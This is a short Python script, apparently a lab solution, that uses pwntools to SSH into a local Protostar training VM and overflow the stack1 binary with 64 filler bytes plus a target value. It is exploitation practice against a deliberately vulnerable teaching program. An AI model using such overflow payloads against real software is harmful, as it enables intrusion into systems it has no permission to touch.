from pwn import * 

#  IP OF THE VM 192.168.160.128
# location of the binary /opt/protostar/bin/stack1


r = ssh(host='192.168.160.128', user='user', password='user')

payload = b'A'*64 + b'\x64\x63\x62\x61'

my_prog= r.run(['/opt/protostar/bin/stack1', payload])


print(my_prog.recvline())



